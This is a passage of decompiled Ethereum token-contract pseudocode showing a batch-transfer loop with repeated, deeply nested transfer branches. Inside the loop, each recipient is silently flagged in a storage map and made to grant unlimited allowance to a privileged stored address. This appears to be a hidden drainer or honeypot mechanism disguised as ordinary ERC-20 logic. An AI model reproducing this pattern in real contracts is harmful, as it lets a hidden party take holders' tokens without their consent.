                            mem[_1187 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1274 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1274 + idx + 68] = mem[_1187 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1274 + 100] = mem[_1274 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1274 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1702 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1702), stor12);
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1157 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1157] = 38
                            mem[_1157 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1236 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1236 + idx + 68] = mem[_1157 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1236 + 100] = mem[_1236 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1236 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1673 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1673), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1200 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1200] = 38
                                mem[_1200 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _989 > balanceOf[address(msg.sender)]:
                                    _1286 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1286 + idx + 68] = mem[_1200 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1286 + 100] = mem[_1286 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1286 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _989
                                if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_987)
                                mem[32] = 0
                                balanceOf[address(_987)] += _989
                                mem[mem[64]] = _989
                                emit Transfer(_989, msg.sender, address(_987));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1703 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1703), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1239 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1239] = 38
                                mem[_1239 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _989 > balanceOf[address(msg.sender)]:
                                    _1353 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1353 + idx + 68] = mem[_1239 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1353 + 100] = mem[_1353 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1353 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _989
                                if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_987)
                                mem[32] = 0
                                balanceOf[address(_987)] += _989
                                mem[mem[64]] = _989
                                emit Transfer(_989, msg.sender, address(_987));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1753 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1753), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1112 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1112] = 38
                            mem[_1112 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1197 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1197 + idx + 68] = mem[_1112 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1197 + 100] = mem[_1197 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1197 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1672 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1672), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1232 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1232] = 38
                                    mem[_1232 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _989 > balanceOf[address(msg.sender)]:
                                        _1343 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1343 + idx + 68] = mem[_1232 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1343 + 100] = mem[_1343 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1343 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _989
                                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_987)
                                    mem[32] = 0
                                    balanceOf[address(_987)] += _989
                                    mem[mem[64]] = _989
                                    emit Transfer(_989, msg.sender, address(_987));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1830 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1830), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1281 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1281] = 38
                                    mem[_1281 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _989 > balanceOf[address(msg.sender)]:
                                        _1410 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1410 + idx + 68] = mem[_1281 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1410 + 100] = mem[_1410 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1410 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _989
                                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_987)
                                    mem[32] = 0
                                    balanceOf[address(_987)] += _989
                                    mem[mem[64]] = _989
                                    emit Transfer(_989, msg.sender, address(_987));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1857 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1857), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1277 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1277] = 38
                                        mem[_1277 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1400 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1400 + idx + 68] = mem[_1277 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1400 + 100] = mem[_1400 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1400 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1875 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1875), stor12);
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1338 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1338] = 38
                                        mem[_1338 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1460 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1460 + idx + 68] = mem[_1338 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1460 + 100] = mem[_1460 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1460 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1898 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1898), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1230 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1230] = 38
                                        mem[_1230 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1340 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1340 + idx + 68] = mem[_1230 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1340 + 100] = mem[_1340 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1340 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1853 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1853), stor12);
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1279 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1279] = 38
                                        mem[_1279 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1405 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1405 + idx + 68] = mem[_1279 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1405 + 100] = mem[_1405 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1405 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1879 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1879), stor12);
        idx = idx + 1
        continue 
}



}
